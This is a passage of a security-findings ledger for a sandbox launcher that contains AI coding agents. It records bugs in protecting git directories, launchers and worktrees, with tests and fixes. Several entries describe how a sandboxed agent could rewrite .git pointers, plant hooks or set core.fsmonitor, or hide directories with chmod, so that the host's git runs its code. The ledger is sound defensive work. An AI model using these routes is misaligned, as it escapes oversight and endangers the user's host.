- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). `_ver_run()` runs the command as a background job writing into a FIFO, and takes its status from a `wait` on that job. `_ver_git_version()` makes its temporary directory first and every call's FIFO goes there; a call outside it (`version_engine()`'s read of `engine-version`) makes a directory of its own. Measured, 48,000 calls per arm, four loops at once, a container held to half a CPU (bash 5.3 on the host, pinned to one): the old form failed 17 times on bash 5.1.16 and 24 times on 5.2.21, none on 5.3.9; the new form none on any of the three. Tests (`tests/test-version.sh`, the first seen red on 5.1 and 5.3): with a `wait` that fails for any process `jobs -p` does not list, through `BASH_ENV`, a command that closes its output and exits 3 gives status 3 and its output (127 before); no temporary directory, or no FIFO to be made, fails starting nothing; one `mktemp` for a `version_engine` that asks git; no descriptor left leaves `_ver_cur` clear and `TMPDIR` empty. The "no git on PATH" check now puts `mktemp`, `mkfifo`, `head` and `rm` on its `PATH`. Each of five lines broken on its own is caught; the falsify tier's one survivor, a fork that fails between two that succeed, is in the ledger as a GAP. The `rm -rf "$tmp"` before the answer's `printf` is gone: the EXIT trap removes it, and bash runs that trap when the `printf` meets a closed pipe (measured on 5.1 and 5.3).
- **Was: OPEN** (2026-11-10). Found by the review of TST-29's fix.
- **Severity: LOW.** Confidence: CONFIRMED by measurement: under the load that shows TST-29, 7 of 48,000 waits failed (`-1`) in bash 5.2.21 with `_ver_run()`'s form, `exec {fd}< <(exec cmd)` with the PID kept, the output read, then `wait` on the PID. (The first measurement, none failed of 12,000, was too few.)
- **Location:** `version.sh: _ver_run()`.
- **What's wrong:** TST-29's fault: bash's `wait` on a finished process substitution reports failure now and then, and `_ver_run()` returns that as the command's status.
- **Effect:** `--version` can at random report less than it knows: most callers take a failure for "unknown"; `describe` keeps the output it read, and a failed read of `core.abbrev` only abbreviates the commit id otherwise. `sync-to-projects.sh` and `project-init.sh` record the engine version with `version_record()`, which removes a project's `engine-version` when the version is `unknown`, until the next sync records it again. No security decision rests on it.
- **Fix direction:** not TST-29's status record: the substitution `exec`s the command so that the bound's kill reaches the command itself. A background job writing into version.sh's own temporary directory, waited for by its PID, keeps both; none failed of 36,000 on bash 5.2.21, which a fix should also measure on 5.1 and 5.3.

### GIT-47: where mountinfo cannot be read, every FUSE filesystem counts as Windows, and `_win_fs()`'s `virtiofs` arm is dead
- **Status: FIXED** (2026-11-08, WSL agent). The dead arm is gone, and `_win_fs()`'s comment says the fallback counts every FUSE filesystem on purpose: statfs cannot tell them apart, so it fails closed. `/proc/mounts` was not read instead: where `/proc/self/mountinfo` cannot be read, it cannot either. T71 in `tests/test-launcher-dir-ro.sh` pins the fallback (a `_win_mounts` that fails and a `stat` that names the type): `fuse` counts with `_wm_wsl` 0 and 1, and so do `fuseblk`, `v9fs`, `smb2`, `cifs` and `ntfs`; `ext2/ext3` and `tmpfs` do not. Red with `fuse` dropped from the list, and with `v9fs` dropped. Removing the arm itself changes nothing, so no test can see it.
- **Was: OPEN** (2026-11-08, checked at `3b98ecd`).
- **Severity: LOW.** It fails closed: a launch is refused, never let through. And it needs `/proc/self/mountinfo` unreadable, which on a Linux host with `/proc` mounted it is not. Confidence: CONFIRMED from source, not run (this host's mountinfo is readable). Linux's `fs/fuse/virtio_fs.c` fills its superblock with `fuse_fill_super_common()`, which sets `FUSE_SUPER_MAGIC` (0x65735546). GNU coreutils' `stat.c` names that magic `fuse` and has no `virtiofs` entry, and GNU stat 9.12 here knows no such name.
- **Location:** `sandbox.sh: _win_fs()`, the `stat -f -c %T` fallback taken when `_win_mounts()` could not read `/proc/self/mountinfo`.
- **What's wrong:** the fallback's `virtiofs)` arm, meant to count virtiofs only on a WSL kernel (`_wm_wsl`), never matches, because `stat -f` prints `fuse` (`fuseblk` in older coreutils) for virtiofs. So virtiofs counts as Windows on any kernel, through the `fuse` arm. So does every other FUSE filesystem (sshfs, rclone), because statfs reports the same magic for all of them. The comment says the fallback decides "by the filesystem's type", which it can do only for 9p, cifs, smb and ntfs.
- **Effect:** where mountinfo is unreadable, a directory on any FUSE filesystem is treated as a Windows one. Every name below it is spelled from readdir, and a launch that needs an overlay, pin or file bind below a writable mount root there is refused, naming the directory.
- **Fix direction:** drop the dead arm, and say in the comment that the fallback counts every FUSE filesystem on purpose (statfs cannot tell them apart, so it fails closed). Or read `/proc/mounts` before falling back to `stat`. Do not match `0x6a656a63`, which the final review of GAP-2 slice 3 suggested for virtiofs: coreutils names no filesystem with it. The same dead arm sat in G125's skip check (`tests/test-git-internals-ro-scan.sh`), removed 2026-11-08; that check skips on any FUSE filesystem, as it should.

## GIT


- **`git_dirs_in` discovery/pruning** — vendor/node_modules/.venv/target pruned by
  name but *not* under `*/.git/*` (so a submodule in `.git/modules` is still
  found); objects/refs/logs pruned; `.git` files/links/dirs classified correctly;
  unreadable `.git` dirs routed to the unreadable bucket. Repro confirmed a real
  `.git` is found and the pruned siblings are skipped.
- **commondir placeholder + refusal** — writes `./` (git treats as no commondir;
  libgit2 refuses `.`), refuses any other value in a real repo dir
  (`-d objects && -f config` gated, so linked-worktree dirs that legitimately
  carry a commondir do not trip it). The earlier `.` placeholder (5793a34) was
  replaced by `./` (91fac80) the *same day, before the v0.10.0 tag* — never
  released, so no upgrade false-refusal. Not a finding. (GIT-30 later found that the refusal read the file through `$(…)`, which drops NULs.)
- **`config.worktree` placeholder** — created empty only when
  `extensions.worktreeConfig` is on; read back via the commondir for worktrees.
- **`_git_config_get` / `_git_config_bool`** — both prefer real `git config
  --file` (pure parse, executes nothing, triggers no fetch) with an awk fallback;
  awk bool matches git's truthiness; safe.
- **`_git_exec_keys` / `_git_include_paths`** — use `git config --file --null
  --list` / `--get-regexp`, which only parse the named file and run nothing;
  the exec-key regex and the `!`-alias / `submodule.*.update` / boolean-fsmonitor
  carve-outs match git's own "runs a program" semantics. These are *not* the
  GIT-1 vector (they never operate on live config).
- **SANDBOX_GIT_MAX** — numeric validation `^[1-9][0-9]{0,5}$`, refusal names up
  to 5 overflow dirs, every repo protected (no silent cap). `>30` NOTE fires
  correctly. Logic sound.
- **pins of the git dir** — directories from mount root down to `.git` bound
  `:rw` onto themselves so `.git` can't be renamed out (mutation 466 proves it);
  shallowest-first so a repo under an existing `:ro` overlay is skipped.
- **hooks symlink / include.path NOTE+WARNING logic** — judged after overlays via
  `_link_walk`/`_walk_exposed`/`_path_walk`, bounded to githooks(5) names; these
  are advisory warnings and are correct in intent.
- **named-group vs host-group scanning** — `_git_skip_root` set to the resolved
  group root for non-host groups and skipped in the git loop; host group is
  scanned. Matches the spec.
- **set -e hazards** — `git_dirs_in` ends `return 0`; the `mapfile < <(git …)`
  and `$(cat commondir)` substitutions are failure-tolerant; no unguarded
  failing command in the git loop that would abort the launch.

## 27. Found while running PLAT-9

`PHASES=5 bash ./verify-on-host.sh` on macOS 26.7.2 (arm64, Homebrew bash 5.3.20, `LANG=en_US.UTF-8`), Colima 0.10.3, from a fresh clone at `f57fb0f`, 2026-11-08. 122 of 123 files passed on the host, and 123 of 123 at the floor.

### TST-31: a falsify check failed on macOS, BSD `cut` refusing a byte that is not UTF-8
- **Status: FIXED** (2026-11-08).
- Severity: LOW (test only). Confidence: CONFIRMED.
- What's wrong, and the fix: `tests/test-falsify-run.sh`'s check that a kill's note keeps an invalid byte (TST-29's diagnostic) read the result file with `cut -d'|' -f1-7`. In a UTF-8 locale BSD `cut` stops at the byte with `Illegal byte sequence` and drops the line, so the check got nothing; GNU `cut`, on Linux and at the floor, passes bytes through. The product is right: `tests/falsify/run.sh` already reads that line under `LC_ALL=C`. Now the test runs its `cut` under `LC_ALL=C` too. Red under `LANG=en_US.UTF-8` before, green after; it passed under `LC_ALL=C` either way.


### TST-32: `tests/test-demonstrate-needs-rebuild.sh` left a directory in the real `~/.cache/ai-containers-it` on every run
- **Status: FIXED** (2026-11-08, WSL agent). Found while running PLAT-9 on WSL with Docker Desktop: `~/.cache/ai-containers-it` held one directory per hermetic suite run on the host (16 since 2026-11-07, each `logs/` and `saved-allowlists/`, empty), outside `TMPDIR`, where `tests/run-all.sh`'s leak check does not look. The floor arm ran with another `HOME` and left none.
- Severity: LOW (test only). Confidence: CONFIRMED: each of the ten test files that run `tests/integration/run.sh` was run alone, and this one alone added a directory.
- What's wrong: the test's interrupt check sends the demonstrator a SIGINT while `tests/integration/run.sh` waits on a stand-in build. An interrupted run keeps its scratch, as it keeps a failed run's, and that scratch is `$HOME/.cache/ai-containers-it/<run id>` whatever `TMPDIR` is. The test shimmed `docker` but left `HOME` the real one.
- The fix: the test exports a `HOME` inside its own temporary directory once the scratch copy is committed, and checks at the end that the real `~/.cache/ai-containers-it` gained nothing. That check was red without the `HOME` export (`new: 20261108175524-927537`).

### TST-33: three tests of LNCH-23's binds failed with a symlinked `TMPDIR`
- **Status: FIXED** (2026-11-08, WSL agent). CI's symlinked-`TMPDIR` job was red on `3c9e3bb` (LNCH-23) and on every push after it.
- Severity: LOW (test only). Confidence: CONFIRMED, reproduced with `tests/run-all.sh` under a symlinked `TMPDIR`.
- What's wrong: `tests/test-host-binds.sh`, `tests/test-rvm-volume.sh` and `tests/test-selinux-label.sh` expected docker's bind source as the test spelled it, through `TMPDIR`. `repo.sh` hands docker the resolved source, and since LNCH-23 so does the rvm migration (`resolve_path`), so under a symlinked `TMPDIR` the source is the physical path and the five assertions failed. The product is right.
- The fix: each expectation is the physical path, taken with `cd` and `pwd -P` (not the `readlink -f` the code uses), as `tests/test-selinux-label.sh` already did for `repo.sh`. Green in both arms.

## 28. Found while doing GAP-2's slice 6

Found 2026-11-10, at `7a740ef`, while classifying the survivors of `git_dirs_in()`. One survivor follows the `./` commondir placeholder, and that put a git directory into a second mount's view. That raised the question of what reaches a second mount's view otherwise.

### GIT-51: what one mount's scan finds is protected only in that mount's view
- **Status: FIXED** (2026-11-10). After the scans, `launcher_ro_overlay()` carries every launcher and unreadable directory, and every git directory, `.git` file and unlistable git directory, that one mount's scan found into every other writable mount that exposes it. Each is keyed by where it lands, so one that two scans find is taken once, and each place counts toward `SANDBOX_LAUNCHER_MAX` and `SANDBOX_GIT_MAX`. T74 in `tests/test-launcher-dir-ro.sh` (a launcher, an unlistable directory) and G142 in `tests/test-git-internals-ro-scan.sh` (a repository under a pruned `node_modules` and one eight levels down, a linked worktree's `.git` file, an unlistable `.git`) were red, each in the outer mount's view. T34's deep peer launcher is now read-only through both mounts, so its link is no longer warned about; T34 keeps its warning check through a mount rooted at the peer launcher itself, which cannot be overlaid. The review of the fix found no defect in it. It led to four smaller changes. A git directory several views expose is judged once, not once per view, which had spent the launch's budgets twice and printed each NOTE twice; one under a read-only overlay in any view keeps that view's check of its links (G142). The `SANDBOX_GIT_MAX` refusals say that each place counts, and the one the protection loop prints marks a name it repeats with where it lands (G142). A launcher the agent plants as the root of its own output directory no longer gets a NOTE saying it runs on the host, which it never does; that NOTE predates GIT-51 (T74). And the FIFO search takes each read-only source once, which only saves time and is not tested. What the reviews found beside it is GIT-55, GIT-56 and GIT-58.
- **Was: OPEN** (2026-11-10).
- **Severity: MEDIUM.** It needs two writable mounts, one inside the other, with the inner one's contents past the outer one's scan. That means under a `node_modules`, `vendor`, `.venv` or `target` the scan prunes, or deeper than it goes (six levels for a launcher or a checkout's `.git`, seven for another git directory). Confidence: CONFIRMED by launches with the fake docker of `tests/lib-git-internals-ro.sh`.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, its loops over `launcher_dirs_in` and `git_dirs_in`, one per writable mount.
- **What's wrong:** each mount's scan protects what it finds in that mount's view alone. A directory that two writable mounts expose is found only by the inner mount's scan when the outer one's does not reach it, and nothing adds it to the outer mount's view. This launcher's own directory is checked against every mount. A git directory a `.git` file or a commondir names, and the repository a mount lies in, are carried into another mount's view (`_xm_t`). Nothing else is.
- **Effect, measured:**
  - **A repository:** with `EXTRA_MOUNTS=$T/b` and the primary `$T/b/node_modules/x`, a repository, `x/.git`'s `config`, `commondir` and `hooks` are read-only at `/workspace/x/.git` and writable at `/workspace/b/node_modules/x/.git`. The launch still prints `READ-ONLY: /workspace/x/.git: config, commondir, hooks`. The same happens with the primary eight levels below `$T/b2`.
  - **A linked worktree:** its `.git` file in `x` is read-only only at `/workspace/x/wt/.git`.
  - **Another project's launcher:** one in `x` is read-only only at `/workspace/x/.ai-containers`.
  - **So:** the agent can set `core.fsmonitor` in the repository you work in, or point a `.git` file at a git directory of its own. It can also edit a launcher that the host runs at that project's next launch.
- **Fix direction:** after the scans, carry each launcher and unreadable directory, git directory, `.git` file and unlistable git directory that one mount's scan found into every other writable mount that exposes it. Key each by where it lands, as `_xm_t` does for a followed git directory. Each place counts toward `SANDBOX_LAUNCHER_MAX` and `SANDBOX_GIT_MAX`, as a directory two scans find counts now.

### GIT-52: the walk up from a mount passes over a `.git` link to a file, and stops at a `.git` that is no repository
- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). The walk up takes what git takes. A `.git` directory, or a link to one, that is no git directory (`_is_git_dir` takes more than git does, so it never passes over one git uses) is passed over and the walk goes on up, a link the agent could repoint still named; a `.git` link to a regular file is followed as a `.git` file out of every writable mount too, and its git directory is quiet there, as a `.git` file's is. G155 in `tests/test-git-internals-ro-index.sh`, each layout checked first against `git rev-parse --absolute-git-dir`, both seen red first: a repository two levels up past an empty `.git` directory has its index read and a submodule under a pruned `vendor/` protected, and nothing is made in the empty one; a `.git` link to a `.git` file above the mount is followed to the git directory it names. Each of the three changes undone alone is caught.
- **Was: OPEN** (2026-11-10).
- **Severity: LOW.** Both cases here need the `.git` outside every writable mount, so they are layouts of your own, and unusual ones: the agent cannot make them. One inside a writable mount is GIT-55. Confidence: CONFIRMED. `git rev-parse --git-dir`, run below a link to a file, names the git directory that the linked file's `gitdir:` line names.
- **Location:** `sandbox.sh: git_dirs_in()`, the walk up from a mount to the repository it lies in.
- **What's wrong:** the walk takes a `.git` that is a regular file or a directory, neither a link, or a link to a directory. Git reads a link to a regular file as a `.git` file. And a `.git` directory, or a link to one, that is no git directory ends the walk there, while git passes over it and goes on up (G145 pins that nothing is made in one).
- **Effect:** for a mount in such a checkout, the walk does not reach the git directory git uses. Its index is not read, so a submodule it records where the scan does not look is not protected. Its `core.hooksPath` and hooks are not judged. The walk goes on to whatever repository lies above, if any.
- **Fix direction:** read a `.git` link that leads to a regular file as the `.git` file branch reads a file, outside every writable mount only. A link to a FIFO stays passed over, as a FIFO is (G64).

### GIT-53: a linked worktree whose `gitdir` is relative is not followed to its checkout
- **Status: FIXED** (2026-11-10). Both places resolve a relative `gitdir` from the git directory, physically: the first as a candidate checkout, the second before its checks that the `.git` file lies outside every writable mount; a relative value is judged where it leads, as git reads it, so the check for a link on the way holds for it by construction. G143 in `tests/test-git-internals-ro-index.sh` writes both pointers relative by hand, so an older git makes the same layout. It checks the checkout under `node_modules`, whose submodule is now read-only with no warning, and a checkout outside every mount, now quiet. Both checks were red.
- **Was: OPEN** (2026-11-10).
- **Severity: LOW.** What is not followed is named: the launch warns `no worktree is known for …, so the submodules its index records are not followed`. Confidence: CONFIRMED. A worktree made with `git worktree add --relative-paths`, or with `worktree.useRelativePaths` set (both git 2.48 and later), its checkout under the mount's `node_modules` and holding a submodule with its own `.git`, left that submodule's `config` writable with that warning. The same worktree with absolute paths had it read-only.
- **Location:** `sandbox.sh: git_dirs_in()`, where a linked worktree's git directory takes its checkout from `gitdir`, and the end of the function, where a waiting git directory whose checkout points back from outside every writable mount is quiet.
- **What's wrong:** both take only an absolute `gitdir`. Git 2.48 and later write it relative to the git directory when asked to. `launcher_ro_overlay()` already reads it so for `core.hooksPath` ("Relative too, as git 2.48 and later can write it").
- **Effect:** such a worktree's checkout is found only when the scan sees its `.git` file. Under a pruned directory or past the scan's depth, the submodules its index records are not protected, and the launch says so. With its checkout outside every writable mount, the launch warns where it should be quiet.
- **Fix direction:** resolve a relative `gitdir` physically from the git directory, as the overlay does (`_cd_phys x "$g" "$y"`), in both places.

### GIT-54: "no worktree is known" for a linked worktree whose checkout another mount reads, or is gone
- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). As the fix direction says: `git_dirs_in()` records the git directories whose index it read against a worktree (`_gdi_wt_read`) and those it found none for (`_gdi_nowt`), and `launcher_ro_overlay()` says "no worktree is known" once every mount is scanned, for one no scan read. The second layout is not silenced, against the fix direction: a `gitdir` the agent rewrote to a path that is not there, which hides the real checkout and must be named (GIT-6; G80, which the first version of this fix broke), looks the same as a checkout you deleted. So where `_path_gone()` finds the checkout gone (the first name that is not there, every directory before it searchable, so one the agent made unsearchable is not "gone"), the warning names the path and the `git --git-dir=<repository> worktree prune` that stops it for one you deleted (checked to prune). G156 in `tests/test-git-internals-ro-index.sh`, both seen red first: G55's layout (main repository in `EXTRA_MOUNTS`, the checkout in the primary) protects the checkout's submodule and says nothing; the checkout deleted, never pruned, is said with the prune. Each change undone alone is caught. The rescan after the session declares both arrays for its own scans, whose stderr goes nowhere.
- **Was: OPEN** (2026-11-10).
- **Severity: LOW** (a false warning). Confidence: CONFIRMED in two layouts. The second, found by the final review of the GIT-51 fixes: a linked worktree whose checkout was deleted and never pruned, its index recording a submodule, is warned about on every launch, though there is no checkout to protect. The first is G55's layout (main repository in `EXTRA_MOUNTS`, the linked worktree's checkout in the primary): the checkout's submodule is protected, and the launch also warns `no worktree is known for <main>/.git/worktrees/<name>, so the submodules its index records are not followed`.
- **Location:** `sandbox.sh: git_dirs_in()`, the warning at its end.
- **What's wrong:** each mount is scanned alone. The main repository's mount sees the worktree's git directory, but its checkout lies in another writable mount, so the git directory waits for a worktree, and the warning fires. Only a checkout outside every writable mount that points back is quiet. Here the other mount's scan follows the checkout's `.git` file and reads the index against it.
- **Fix direction:** decide the warning after every mount is scanned, in `launcher_ro_overlay()`, and drop it for a git directory another mount's scan read. Keep it quiet, too, for a `gitdir` whose checkout does not exist, as the overlay already is for `core.hooksPath` ("Not named as unknown on every launch").

### GIT-55: a `.git` file or link above a mount, inside an outer writable mount past its scan, is left writable
- **Status: FIXED** (2026-11-10). The walk up carries a `.git` file it meets in another writable mount into that mount's view as a file to bind read-only (a typed `_xm_t` entry), as GIT-51 carries what a scan finds. It now takes a `.git` link inside a writable mount too: it names it, once a launch, through the set the scan's own naming uses, and follows it as one outside every mount is followed, or, when it leads to a file, as the `.git` file it then is (from the final review of the fix). G142 checks the file (read-only in the outer view), the link (named once, its repository protected in the outer view) and a link the outer scan reaches as well (named once). The first two were red. Not done: the rescan after the session still does not name a `.git` file or link the session made on the way up, since the walk's finds are not in its lists. The automated security review of the fix held that such a link, followed now, takes the place of the repository the walk reaches above it. It does not, measured: that repository is still judged from its own checkout (a `.git` directory's parent is always a base) and protected where the agent can write it, the link's directory is added as one more base, which is right (git run below the link takes it for its worktree), and what the link leads to is protected in the views the agent can write.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-51's fix; it predates that fix.
- **Severity: MEDIUM.** The agent can make one, through the outer mount, and the host's git in the primary then uses it. Confidence: CONFIRMED by the reviewer with the fake docker of `tests/lib-git-internals-ro.sh`. With `EXTRA_MOUNTS=$O`:
  - **A `.git` file:** the primary is `$O/node_modules/x/sub` and `x` a linked worktree. The walk follows `x/.git` to its git directory, but the file itself is bound read-only in no view, so the agent can rewrite its `gitdir:`.
  - **A `.git` link:** the primary is `$O/node_modules/q/sub`, and `q/.git` is a link to `../.evil`, a bare repository with a `pre-commit` hook. `git rev-parse --git-dir` in `q/sub` names `.evil`. The launch prints nothing and binds nothing, at this launch and at the next.
- **Location:** `sandbox.sh: git_dirs_in()`, the walk up from a mount to the repository it lies in.
- **What's wrong:** the walk follows a `.git` file's target into other writable mounts' views (`_xm_t`) but queues the file itself nowhere. And it takes a `.git` link only outside every writable mount (`! _in_writable`): one inside is left to the scan, which in this layout does not reach it. The rescan after the session does not name either, since the walk's finds are not in its lists.
- **Fix direction:** queue a `.git` file inside another writable mount as a file to bind read-only in that mount's view, as GIT-51 carries what a scan finds. Follow a `.git` link inside a writable mount as one outside is followed, and name it as the scan names a `.git` link in a writable mount. Add both to G142.

### GIT-56: a repository mounted read-only inside an outer writable mount stays writable through it
- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). As the fix direction says: a read-only bind's source is kept (`rosrc`), and one that lies inside a writable mount is scanned with `git_dirs_in()` once the writable mounts are, what it finds carried into the view of each writable mount that holds it (the `_xm_t` queue, which drops what is bound there already) and a `.git` link there named; its own view stays read-only whole. G157 in `tests/test-git-internals-ro-scan.sh`, the reviewer's layout (`DOCS_PATH=$O/node_modules/x`, `EXTRA_MOUNTS=$O`), seen red first: `x/.git/config` and `hooks` are read-only at `/workspace/o157/node_modules/x/.git`, and nothing is bound under `/workspace/docs`. Each of the two changes undone alone is caught. The same gap for launchers was LNCH-24, fixed with it.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-51's fix.
- **Severity: LOW.** It needs a pointer you mount read-only (`DOCS_PATH`, `ARCHITECTURE_REPO_PATH`, an `EXTRA_MOUNTS` entry with `:ro`) inside a writable mount whose scan does not reach it. Confidence: CONFIRMED by the reviewer: `DOCS_PATH=$O/node_modules/x` with `EXTRA_MOUNTS=$O` binds nothing for `x/.git`, so it is writable at `/workspace/<o>/node_modules/x/.git`.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, which scans writable mounts only.
- **What's wrong:** a read-only mount is not scanned, since nothing in it can be written through it, so nothing found in it is carried into the writable mount that also exposes it.
- **Fix direction:** scan a read-only mount that lies inside a writable one, for carrying what it finds into the writable mount's view only.

### GIT-57: a decoy `gitdir` silences "no worktree is known"
- **Status: FIXED** (2026-11-10). A linked worktree's git directory takes its checkout from `gitdir` only where that checkout's `.git` names it back, resolved physically from the checkout as git resolves it (`_gdi_points_back()`). G146 rewrites a worktree's `gitdir` to name a directory in the mount, and the warning is given. That check was red. What remains, as the automated security review of the fix pointed out: a decoy that also plants a `.git` naming the git directory back still passes. It needs two files written before the first protection binds `gitdir` read-only, which is the limit any configuration poisoned before the protection existed has.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-53's fix; it predates that fix.
- **Severity: LOW.** It silences a warning. What the warning was about stays as unprotected as it was, and the agent must write the `gitdir` before the first protection binds it read-only. Confidence: CONFIRMED by the reviewer, absolute and relative.
- **Location:** `sandbox.sh: git_dirs_in()`, where a linked worktree's git directory takes its checkout from `gitdir`.
- **What's wrong:** any `gitdir` that leads to a directory inside the mount (`$PROJ/.git/worktrees`, `/proc/self/cwd/.git`) gives the git directory a checkout to read its index against, so the warning at the end of the function never fires, while its real checkout, under a pruned directory, is not reached. The comment says a decoy "adds a checkout to check, no more"; it also replaces the only one the warning would have named.
- **Fix direction:** take a `gitdir` checkout only where its `.git` file names this git directory back, as the end of the function does for one outside every mount.

### GIT-58: a linked worktree's checkout `.git` file the scan does not reach is left writable
- **Status: FIXED** (2026-11-10). The checkout a linked worktree's `gitdir` leads to, which now must point back (GIT-57), has its `.git` file queued like one the scan finds, as a known referrer so that following it does not read the git directory again (G103 still holds). G146 checks that file is read-only under `node_modules`. That check was red. The final review of the fix found the case it left: a checkout `.git` an earlier session rewrote to name a repository of the agent's no longer points back, so it was neither bound nor followed. Now the `.git` of the checkout `gitdir` names is taken whatever it names: a file is bound read-only and followed, so the repository it names is protected (and its hooks named at their first protection), and a link is named; only one pointing back is a checkout to read against, and a known referrer. G146 checks both (each red before), and that the index is still read once (it kills the preset's removal). The review of that found two more: a `core.worktree` the agent writes in the worktree's git directory, where git never reads one but the launcher does, named the checkout first and the bind stopped; and a `.git` replaced by a directory was not taken. The `.git` is now taken whatever names the checkout, and a directory is protected as a `.git` directory the scan finds; G146 checks both, each red before. Left, from the review of that: a checkout in another writable mount (GIT-59), a directory on the way the agent made unsearchable (GIT-60), and a `.git` directory a decoy names first while it is no git directory (GIT-61).
- **Was: OPEN** (2026-11-10). Found by the final review of the GIT-51 fixes; it predates them.
- **Severity: MEDIUM.** The agent can rewrite the file's `gitdir:` to name a repository it makes there, and your host's git, run in that worktree, then runs that repository's hooks. Confidence: CONFIRMED by the reviewer at `7a740ef` and after the fixes, in G146's layout: a linked worktree checked out at `$PROJ/node_modules/aw`, holding a submodule. The submodule's `config`, `commondir` and `hooks` are read-only and `node_modules/aw` is pinned; `node_modules/aw/.git` is bound nowhere.
- **Location:** `sandbox.sh: git_dirs_in()`, the loop over a git directory's checkouts (`for top in "${tops[@]}"`). It adds `$top/.git` to the files bound read-only only for a git directory under `.git/modules` (G147).
- **What's wrong:** a linked worktree's git directory finds its checkout through `gitdir`, but the checkout's `.git` file is bound only when the scan itself finds it, which it does not under `node_modules`, `vendor`, `.venv` or `target`, or past its depth.
- **Fix direction:** bind `$top/.git` read-only for a linked worktree's git directory too, where that file names this git directory back. The same check would close GIT-57. Add the bind to G146.

### GIT-59: a linked worktree's checkout in another writable mount, past that mount's scan, keeps its `.git` writable
- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). In `git_dirs_in()`'s `gitdir` branch, a checkout in another writable mount than the one scanned has its `.git` carried into that mount's view as the walk up carries one there (GIT-55): a file bound read-only (a typed `_xm_t` entry), and followed when it names a git directory other than this one, a link named (`_gdi_name_link()`), a directory protected as a repository (`unr`, read-only whole, if it cannot be listed). G152 in `tests/test-git-internals-ro-index.sh`, the reviewer's layout (`EXTRA_MOUNTS=$O`, the worktree at `$O/node_modules/aw152`, launch `..`), all four seen red first: the `.git` read-only at `/workspace/o152/node_modules/aw152/.git`; rewritten to name a bare repository in `$O`, read-only and that repository's `hooks` too; made a link, named; replaced by a repository, its `config` and `hooks` read-only. Each of five lines broken on its own is caught. A checkout that points back is not followed again, since it names the git directory being protected; whether its index is then read against it is GIT-54.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-58's fix; it predates it.
- **Severity: MEDIUM.** The agent can rewrite that `.git` to name a repository of its own, and your host's git, run in that worktree, then runs its hooks. Confidence: CONFIRMED by the reviewer: `EXTRA_MOUNTS=$O`, a worktree of the primary's repository checked out at `$O/node_modules/aw`, launch `..`: nothing is bound for `$O/node_modules/aw/.git`, and nothing is named.
- **Location:** `sandbox.sh: git_dirs_in()`, where a linked worktree's git directory takes its checkout from `gitdir`: only a checkout inside the scanned mount is taken.
- **Fix direction:** carry the checkout's `.git` into the view of the writable mount that holds it, as the walk up carries a `.git` file (a typed `_xm_t` entry), and follow it there.

### GIT-60: where unlistable directories are not looked for, a directory the agent made unsearchable hides a checkout's `.git` on the way to it
- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list), the fix direction's first half. `_gdi_blocked()` walks a path a pointer names from `/` as written (`..` stepping back where it is written, a link in a writable mount or a name that is not there ending it), finds the first directory on the way that you cannot search, and protects it read-only whole (kind `unr`, so the `chmod` WARNING) in each writable mount that holds it below its root: this mount's view, or carried into another's. Only one the agent could reach into, by `launcher_dirs_in()`'s rule (it owns it, or its mode lets it search): one nobody but its owner can enter is left alone, as the scan leaves it. Called where the path cannot be reached: the `gitdir` branch (the checkout, or a directory on the way, unsearchable), the gitlink loop (a checkout that is not there; one there that cannot be searched, which GIT-3's WARNING named as unprotected and which is now bound instead), and a `core.worktree` that `_cd_phys` cannot resolve (an absorbed submodule's checkout). G153 in `tests/test-git-internals-ro-index.sh`, not as root, all seen red first: `node_modules` made 000 before a worktree's checkout, and the checkout itself; with an agent of another uid and gid, that directory not bound; G22's `vendor` made 000, and its `vendor/emb`; an absorbed submodule under `target/`, recorded in no index, with `target` made 000. Each call site removed on its own, and the reach check, is caught. A checkout with no pointer to it, behind such a directory deeper than six levels, is not looked for: the scan finds a checkout's own `.git` to six levels, where `launcher_dirs_in()` finds the unsearchable directory.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-58's fix; it predates it, and GIT-3's warning covers only half of it.
- **Severity: MEDIUM.** The agent owns the directories it can write, the pinned ones included, and can `chmod 000` one in a session. It bites only where unlistable directories are not looked for: under a pruned `node_modules`, `vendor`, `.venv` or `target`, or deeper than six levels (`launcher_dirs_in()`'s search, which finds them, stops at six; the git scan finds a `.git` file to eight, so a checkout at depth seven behind a `chmod 000` directory is not bound and not named, measured by the review of this entry). One met above that is bound read-only whole with the `chmod` WARNING. Confidence: CONFIRMED by the reviewer with the fake docker; the `chmod` itself was not run in a real container.
  - **A linked worktree's checkout** under `node_modules`, reached only through `gitdir`: with `node_modules`, or the checkout itself, made `000`, the next launch binds nothing there and says nothing of it (at most "no worktree is known", where the worktree's index records a submodule). In that session the agent can restore the mode and point the checkout's `.git` at a repository of its own; the rescan after the session names it only if the mode was restored.
  - **An embedded submodule an index records** (G22's `vendor/emb`): with `vendor` made `000`, its `config` and `hooks` are not protected and nothing is said. GIT-3's WARNING fires only when the checkout directory itself cannot be searched.
- **Location:** `sandbox.sh: git_dirs_in()`: the `gitdir` branch (`-d "$tgt"`, `_cd_phys`), the gitlink loops (`[[ -e "$co" || -L "$co" ]]`, then the `.git` tests), and the `.git` file of a `.git/modules` checkout.
- **Fix direction:** where a path that lies in the mount cannot be reached because a directory on the way cannot be searched, find the first such directory from the mount root and bind it read-only whole, with the `chmod` WARNING, as an unlistable directory found by the scan is (which also stops a later `chmod` from inside); at the least, name it. Test with G146 and G22 variants.

### GIT-61: a decoy names a checkout's `.git` directory first, while it is no git directory, and it goes unprotected
